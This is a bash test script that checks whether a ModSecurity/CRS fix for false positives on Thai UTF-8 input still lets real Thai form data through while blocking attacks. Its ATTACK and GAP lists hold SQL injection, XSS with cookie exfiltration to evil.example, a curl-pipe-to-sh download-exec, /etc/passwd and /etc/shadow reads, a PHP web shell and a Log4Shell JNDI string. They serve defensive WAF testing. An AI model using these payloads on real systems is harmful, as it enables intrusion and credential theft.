#!/usr/bin/env bash
# Test the Thai UTF-8 false-positive fix (install-crs-thai-fix.sh) against a
# live box. Replays the Thai requests that were actually blocked, plus
# injection payloads that must stay blocked. Read-only for the box: it only
# sends HTTP (and reads the audit log when it can, for the report).
#
#   THAI   -> must NOT be 403 (any other code = passed the WAF)
#   ATTACK -> MUST be 403
#   GAP    -> INFO only, never a FAIL: single-rule payloads (score 5) that
#             pass stock CRS too at inbound threshold 7. Shows the threshold
#             gap; turns into BLOCKED if the threshold is lowered to 5.
#
# Run it BEFORE the fix too: THAI rows failing there proves the test really
# reproduces the problem. After the fix every THAI/ATTACK row must PASS.
#
# Usage:
#   ./test-crs-thai-fix.sh https://uatbox.one.th
#   RESOLVE_IP=127.0.0.1 ./test-crs-thai-fix.sh https://uatbox.one.th   # run ON the proxy box
#   MODE=real ./test-crs-thai-fix.sh https://uatbox.one.th
#
# MODE=dummy (default): every request goes to /__waf_test/<real path>. CRS
#   inspects every path the same way, but path-scoped exclusions (the
#   register_business_v2 ruleEngine=Off bypass, per-field ruleRemoveTargetById
#   on check_duplicate_inbox) do NOT apply there -- so the result shows what
#   CRS itself does. The backend just answers 404/502.
# MODE=real: the real endpoints. Exclusions DO apply (can hide a failure), and
#   the requests reach the backend -- register_business_v2 may really create
#   a business on UAT. Use only to confirm the real flow after MODE=dummy passes.
#
# RESOLVE_IP: send to this IP but keep the hostname (TLS SNI + Host header),
#   e.g. 127.0.0.1 when running on the proxy itself. fail2ban ignores
#   127.0.0.1, so the ATTACK rows then post no Discord alerts. From anywhere
#   else, expect BLOCK alerts for the attack rows (the jail only alerts, it
#   does not ban; repeats within 30s collapse into one).
#
# INSECURE=1: curl -k (self-signed / IP certs).
#
# Log file (every run): LOG_FILE, default ./test-crs-thai-fix-<run>.log --
#   per case: request, full payload, response code, result, and the rule ids
#   ModSecurity matched (from AUDIT_LOG, default /var/log/modsec_audit.log,
#   when it is readable, i.e. running on the box as root; Native format).
#
# Every request carries "X-WAF-Test: <run>-<case>" to find it in the audit log.
set -uo pipefail

BASE="${1:-}"
[ -n "$BASE" ] || { echo "usage: $0 https://host [see header for MODE/RESOLVE_IP/INSECURE/LOG_FILE]" >&2; exit 2; }
BASE="${BASE%/}"
MODE="${MODE:-dummy}"
RUN="t$(date +%Y%m%d-%H%M%S)"
LOG_FILE="${LOG_FILE:-./test-crs-thai-fix-$RUN.log}"
AUDIT_LOG="${AUDIT_LOG:-/var/log/modsec_audit.log}"

CURL=(curl -s -o /dev/null -w '%{http_code}' --max-time 15)
[ "${INSECURE:-0}" = 1 ] && CURL+=(-k)
if [ -n "${RESOLVE_IP:-}" ]; then
  hostport="${BASE#*://}"; host="${hostport%%/*}"; host="${host%%:*}"
  port="${hostport#*:}"; port="${port%%/*}"
  [ "$port" = "${hostport%%/*}" ] && { [[ "$BASE" == https* ]] && port=443 || port=80; }
  CURL+=(--resolve "$host:$port:$RESOLVE_IP")
fi

p() {  # path per MODE
  if [ "$MODE" = real ]; then echo "$1"; else echo "/__waf_test$1"; fi
}
jesc() {  # JSON string escape
  local s="${1//\\/\\\\}"; s="${s//\"/\\\"}"; printf '%s' "$s"
}

PASS=0; FAIL=0; GAP_PASSED=0; GAP_BLOCKED=0; FAILED_IDS=()
CASE_IDS=(); declare -A C_EXPECT C_CODE C_RESULT C_DESC C_REQ C_PAYLOAD

row() {  # id expect code desc request payload
  local id="$1" expect="$2" code="$3" desc="$4" ok
  if [ "$code" = 000 ]; then ok=ERROR
  elif [ "$expect" = INFO ]; then
    if [ "$code" = 403 ]; then ok=BLOCKED; GAP_BLOCKED=$((GAP_BLOCKED + 1)); else ok=PASSED; GAP_PASSED=$((GAP_PASSED + 1)); fi
  elif [ "$expect" = BLOCK ] && [ "$code" = 403 ]; then ok=PASS
  elif [ "$expect" = ALLOW ] && [ "$code" != 403 ]; then ok=PASS
  else ok=FAIL; fi
  case "$ok" in
    PASS|BLOCKED|PASSED) [ "$ok" = PASS ] && PASS=$((PASS + 1)) ;;
    *) FAIL=$((FAIL + 1)); FAILED_IDS+=("$id") ;;
  esac
  CASE_IDS+=("$id"); C_EXPECT[$id]="$expect"; C_CODE[$id]="$code"; C_RESULT[$id]="$ok"
  C_DESC[$id]="$desc"; C_REQ[$id]="$5"; C_PAYLOAD[$id]="$6"
  printf '%-4s %-6s %-5s %-7s %s\n' "$id" "$expect" "$code" "$ok" "$desc"
}

json() {  # id expect path body desc
  local url="$BASE$(p "$3")"
  row "$1" "$2" "$("${CURL[@]}" -X POST "$url" -H "X-WAF-Test: $RUN-$1" \
    -H 'Content-Type: application/json' --data-binary "$4")" "$5" "POST $url (application/json)" "$4"
}
get() {   # id expect path+query desc
  local url="$BASE$(p "$3")"
  row "$1" "$2" "$("${CURL[@]}" "$url" -H "X-WAF-Test: $RUN-$1")" "$4" "GET $url" "(query string in URL)"
}
form() {  # id expect path desc -- name=value ...  (application/x-www-form-urlencoded)
  local id="$1" expect="$2" url="$BASE$(p "$3")" desc="$4"; shift 5
  local args=() kv; for kv in "$@"; do args+=(--data-urlencode "$kv"); done
  row "$id" "$expect" "$("${CURL[@]}" -X POST "$url" -H "X-WAF-Test: $RUN-$id" "${args[@]}")" \
    "$desc" "POST $url (application/x-www-form-urlencoded)" "$(printf '%s\n' "$@")"
}
multipart() {  # id expect path desc -- name=value ...
  local id="$1" expect="$2" url="$BASE$(p "$3")" desc="$4"; shift 5
  local args=() kv; for kv in "$@"; do args+=(--form-string "$kv"); done
  row "$id" "$expect" "$("${CURL[@]}" -X POST "$url" -H "X-WAF-Test: $RUN-$id" "${args[@]}")" \
    "$desc" "POST $url (multipart/form-data)" "$(printf '%s\n' "$@")"
}
inj() {  # id expect desc payload -> JSON field on check_duplicate_inbox
  json "$1" "$2" "$INBOX" "{\"header_info\":{\"CustomerName\":\"$(jesc "$4")\"}}" "$3"
}

INBOX=/onebox_uploads/api/check_duplicate_inbox
REG=/admin/api/register_business_v2

# register_business_v2 form, as captured from the browser (22/Sep)
REG_FIELDS=(
  "taxid=0105547062897" "type_business=บริษัทจำกัด"
  "business_name_en=ASRAS MEDICAL" "business_name_th=แอสราส เมดิคอล"
  "branch_name=สำนักงานใหญ่" "branch_no=00000" "tel=0000000000" "email=oneidonebox@thai.com"
  "HouseNumber=129/199" "RoomNumber=-" "FloorNumber=-" "BuildingName=-" "MooNumber=-"
  "SoiName=นวมินทร์ 163" "StreetName=-" "Thambol=นวลจันทร์" "Amphur=บึงกุ่ม"
  "Province=กรุงเทพมหานคร" "PostCode=10230"
)

# connectivity check: 000 = nothing listening / TLS / DNS problem
code="$("${CURL[@]}" "$BASE/")"
if [ "$code" = 000 ]; then
  echo "ERROR: cannot reach $BASE (try INSECURE=1, or RESOLVE_IP=<proxy ip>)" >&2; exit 2
fi

echo "target=$BASE mode=$MODE run=$RUN${RESOLVE_IP:+ resolve=$RESOLVE_IP}"
printf '%-4s %-6s %-5s %-7s %s\n' ID EXPECT CODE RESULT CASE
echo "---- THAI: real requests that were blocked (must NOT be 403) ----"
json T1 ALLOW "$INBOX" \
  '{"header_info":{"Doc_remark1":"PT43: เลดี้ วีแคร์ (Lady We Care)","BuyerLineTwo":"แขวงคลองเตย เขตคลองเตย กรุงเทพมหานคร"}}' \
  "check_duplicate_inbox alert 23/Sep 14:02 (Doc_remark1+BuyerLineTwo)"
json T2 ALLOW "$INBOX" \
  '{"header_info":{"BuyerLineOne":"3424 ออโตเมทเอพีไอ","CustomerName":"นายคอมสามสอง โกสามสองยี่สิบเก้า"}}' \
  "check_duplicate_inbox alert 23/Sep 14:23 (BuyerLineOne+CustomerName)"
json T3 ALLOW "$INBOX" \
  '{"header_info":{"Doc_remark1":"PT43: เลดี้ วีแคร์ (Lady We Care)","BuyerLineOne":"3424 ออโตเมทเอพีไอ","BuyerLineTwo":"แขวงคลองเตย เขตคลองเตย กรุงเทพมหานคร","CustomerName":"นายคอมสามสอง โกสามสองยี่สิบเก้า"}}' \
  "check_duplicate_inbox all 4 fields together"
multipart T4 ALLOW "$REG" "register_business_v2 multipart form (22/Sep)" -- "${REG_FIELDS[@]}"
form T5 ALLOW "$REG" "register_business_v2 same fields, urlencoded" -- "${REG_FIELDS[@]}"
json T6 ALLOW "$INBOX" \
  '{"header_info":{"CustomerName":"บริษัท ศรีวรรณ ฯ ฮอลล์ ว่าที่ร้อยตรี","Doc_remark1":"ชำระแล้ว ๑๒๓ ＡＢＣ１２３"}}' \
  "Thai with ว ร ล ศ ษ ฯ ฮ + full-width letters/digits (no attack)"

echo "---- ATTACK: injection that must stay blocked (must be 403) ----"
# All verified 403 at inbound threshold 7 with the fix (CRS 4.25.1).
# Format: id|desc|payload  (payload is the rest of the line, may contain |)
while IFS='|' read -r id desc payload; do
  [ -z "$id" ] && continue
  inj "$id" BLOCK "$desc" "$payload"
done <<'EOF_ATTACK'
A1|SQLi UNION SELECT|1' UNION SELECT username,password FROM users--
A2|SQLi time-based SLEEP|1' AND SLEEP(5)--
A3|SQLi stacked DROP TABLE|1'; DROP TABLE users--
A4|SQLi UNION information_schema|1 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--
A5|SQLi MSSQL xp_cmdshell|'; EXEC xp_cmdshell('dir')--
A6|SQLi hidden after Thai text|นายคอมสามสอง' UNION SELECT username,password FROM users--
A7|SQLi full-width quote (rule 1000200)|1＇ OR 1=1--
A8|XSS script tag|<script>alert(1)</script>
A9|XSS img onerror|<img src=x onerror=alert(1)>
A10|XSS svg onload cookie|<svg/onload=alert(document.cookie)>
A11|XSS javascript: URI|javascript:alert(1)
A12|XSS attribute break-out + exfil|"><script>fetch('//evil.example/?c='+document.cookie)</script>
A13|XSS iframe javascript:|<iframe src="javascript:alert(1)">
A14|XSS full-width brackets (rule 1000201)|＜script＞alert(1)＜/script＞
A15|RCE ; cat /etc/passwd|; cat /etc/passwd
A16|RCE $(curl ... sh) download-exec|$(curl evil.example/sh|sh)
A17|RCE backticks|`whoami`
A18|LFI ../etc/passwd|../../../../etc/passwd
A19|LFI windows win.ini|../../../../../../windows/win.ini
A20|LFI ....// bypass|....//....//etc/passwd
A21|LFI /etc/shadow|/etc/shadow
A22|PHP code injection|<?php system($_GET['c']); ?>
A23|SSTI {{7*7}}|{{7*7}}${7*7}
A24|Log4Shell JNDI|${jndi:ldap://evil.example/a}
EOF_ATTACK
get A25 BLOCK "/search?q=1%u0027%20UNION%20SELECT%20password%20FROM%20users--" "SQLi %u-encoded quote (GET)"
get A26 BLOCK "/search?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E" "XSS %u-encoded (GET)"
multipart A27 BLOCK "$REG" "SQLi inside register_business_v2 form" -- \
  "business_name_th=แอสราส เมดิคอล" "SoiName=นวมินทร์ 163' UNION SELECT username,password FROM users--"

echo "---- GAP: single-rule payloads, pass stock CRS too at threshold 7 (INFO, not a FAIL) ----"
while IFS='|' read -r id desc payload; do
  [ -z "$id" ] && continue
  inj "$id" INFO "$desc" "$payload"
done <<'EOF_GAP'
G1|SQLi login bypass ' OR '1'='1 (942100 only)|' OR '1'='1
G2|SQLi ' OR 1=1-- (942100 only)|' OR 1=1--
G3|SQLi admin'-- (942100 only)|admin'--
G4|SQLi ' OR 1=1# (942100 only)|' OR 1=1#
G5|SQLi ORDER BY column probe (942100 only)|1' ORDER BY 10--
G6|SQLi error-based CONVERT (942100 only)|1' AND 1=CONVERT(int,(SELECT @@version))--
G7|RCE pipe to id (no rule)|| id
G8|PHP wrapper php://filter (933140 only)|php://filter/convert.base64-encode/resource=index.php
EOF_GAP

echo "----"
echo "PASS=$PASS FAIL=$FAIL  (GAP info: $GAP_PASSED passed the WAF, $GAP_BLOCKED blocked)"
[ "$GAP_PASSED" -gt 0 ] && echo "GAP: single-rule attacks score 5 < inbound threshold 7 and pass -- same on stock CRS, not caused by the Thai fix. Threshold 5 blocks G1-G6/G8; G7 matches no rule at paranoia level 1."

# ---- log file ----------------------------------------------------------------
declare -A C_RULES
AUDIT_NOTE="not read ($AUDIT_LOG not readable -- run on the proxy box as root for rule ids)"
if [ -r "$AUDIT_LOG" ]; then
  sleep 1  # let ModSecurity flush the last transactions
  # One pass over the tail of the audit log (Native format): per transaction
  # carrying our X-WAF-Test header, collect the [id "..."] values.
  while read -r cid rules; do
    C_RULES[$cid]="$rules"
  done < <(tail -c 500M "$AUDIT_LOG" | awk -v pfx="X-WAF-Test: $RUN-" '
    function flush() { if (cid != "") print cid, (ids == "" ? "-" : substr(ids, 2)); cid = ""; ids = "" }
    /^---[A-Za-z0-9]+---A--/ { flush() }
    {
      i = index($0, pfx)
      if (i) { cid = substr($0, i + length(pfx)); sub(/[^A-Za-z0-9].*$/, "", cid) }
      s = $0
      while (match(s, /\[id "[0-9]+"\]/)) {
        r = substr(s, RSTART + 5, RLENGTH - 7)
        if (index(" " ids " ", " " r " ") == 0) ids = ids " " r
        s = substr(s, RSTART + RLENGTH)
      }
    }
    END { flush() }')
  AUDIT_NOTE="$AUDIT_LOG (rule ids per case below; '-' = logged, no rule matched; 'not in audit log' = ModSecurity did not log it)"
fi

{
  echo "# test-crs-thai-fix.sh report"
  echo "run:        $RUN"
  echo "date:       $(date '+%Y-%m-%d %H:%M:%S %z')"
  echo "host:       $(hostname)"
  echo "target:     $BASE"
  echo "mode:       $MODE${RESOLVE_IP:+ (resolve $RESOLVE_IP)}"
  echo "audit log:  $AUDIT_NOTE"
  echo "summary:    PASS=$PASS FAIL=$FAIL  GAP passed=$GAP_PASSED blocked=$GAP_BLOCKED"
  echo "legend:     THAI expect ALLOW (not 403), ATTACK expect BLOCK (403), GAP = INFO only"
  echo
  printf '%-4s %-6s %-5s %-7s %-62s %s\n' ID EXPECT CODE RESULT CASE RULES
  for id in "${CASE_IDS[@]}"; do
    rules="${C_RULES[$id]:-}"; [ -r "$AUDIT_LOG" ] && [ -z "$rules" ] && rules="not in audit log"
    printf '%-4s %-6s %-5s %-7s %-62s %s\n' "$id" "${C_EXPECT[$id]}" "${C_CODE[$id]}" "${C_RESULT[$id]}" "${C_DESC[$id]}" "${rules:-n/a}"
  done
  echo
  echo "## details"
  for id in "${CASE_IDS[@]}"; do
    echo
    echo "=== $id  ${C_RESULT[$id]}  (expect ${C_EXPECT[$id]}, got ${C_CODE[$id]})  ${C_DESC[$id]}"
    echo "request: ${C_REQ[$id]}"
    echo "header:  X-WAF-Test: $RUN-$id"
    [ -n "${C_RULES[$id]:-}" ] && echo "rules:   ${C_RULES[$id]}"
    echo "payload:"
    printf '%s\n' "${C_PAYLOAD[$id]}" | sed 's/^/  /'
  done
} > "$LOG_FILE"
echo "log: $LOG_FILE"

if [ "$FAIL" -gt 0 ]; then
  echo "THAI FAIL (403): fix not applied / CRS re-cloned -> run install-crs-thai-fix.sh"
  echo "ATTACK FAIL (not 403): client IP whitelisted (whitelist-ip.txt), MODE=real path excluded, or rule engine DetectionOnly"
  echo "rule ids for failed cases: see RULES column in $LOG_FILE (run on the proxy box as root)"
  exit 1
fi
